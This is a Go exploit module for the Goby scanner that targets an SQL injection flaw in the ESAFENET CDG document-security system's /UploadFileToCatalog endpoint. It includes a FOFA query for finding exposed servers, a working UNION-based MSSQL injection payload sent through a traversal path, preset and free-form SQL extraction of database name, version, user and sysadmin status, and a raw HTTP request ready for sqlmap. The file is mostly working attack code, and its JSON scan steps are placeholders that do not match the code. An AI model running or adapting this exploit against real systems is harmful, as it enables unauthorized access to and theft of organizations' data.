package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /UploadFileToCatalog SQL Injection Vulnerability",
    "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents. </p><p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-03-25",
    "PostTime": "2024-08-13",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "GobyQuery": "title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "Level": "1",
    "Impact": "<p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/ZL_1618/article/details/136939630"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name,is_admin",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT 111*6",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全系统 /UploadFileToCatalog SQL 注入漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，实现电子文档的数据安全。&nbsp;</p><p>亿赛通电子文档安全管理系统/UploadFileToCatalog接口存在SQL注入，攻击者可通过此漏洞获取敏感信息。 <br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统/UploadFileToCatalog接口存在SQL注入，攻击者可通过此漏洞获取敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /UploadFileToCatalog SQL Injection Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encryption software, which uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.&nbsp;</p><p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`
	setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2 := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.FollowRedirect = false
    //对sql进行url编码
    encodedsql :=""
		//对指令进行url编码
		for _, r := range sql {
      encodedsql += "%" + fmt.Sprintf("%02X", r)
    }
		requestConfig.Data = `id=` + encodedsql
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "37842782"
			// 无法通过计算MD5等计算手段判断是否存在注入，因此设置了一个随机的固定的值，用于判断是否存在注入，默认情况下不会出现这个值
			sql := `1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'--start--'+ISNULL(CAST((select 4657*8126) AS NVARCHAR(4000))+'--end--',CHAR(32)),NULL,NULL,NULL-- `

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `--start--([\s\S]*?)--end--`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
Content-Type: application/x-www-form-urlencoded
 
id=%31%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%27%2d%2d%73%74%61%72%74%2d%2d%27%2b%49%53%4e%55%4c%4c%28%43%41%53%54%28%28%73%65%6c%65%63%74%20%34%36%35%37%2a%38%31%32%36%29%20%41%53%20%4e%56%41%52%43%48%41%52%28%34%30%30%30%29%29%2b%27%2d%2d%65%6e%64%2d%2d%27%2c%43%48%41%52%28%33%32%29%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `--start--([\s\S]*?)--end--`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasniciaybcdbdcywbd3y22bhdyu2
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT IS_SRVROLEMEMBER('sysadmin')"
					}
				}
        sql = `1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'--start--'+ISNULL(CAST((`+sql+`) AS NVARCHAR(4000))+'--end--',CHAR(32)),NULL,NULL,NULL-- `
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
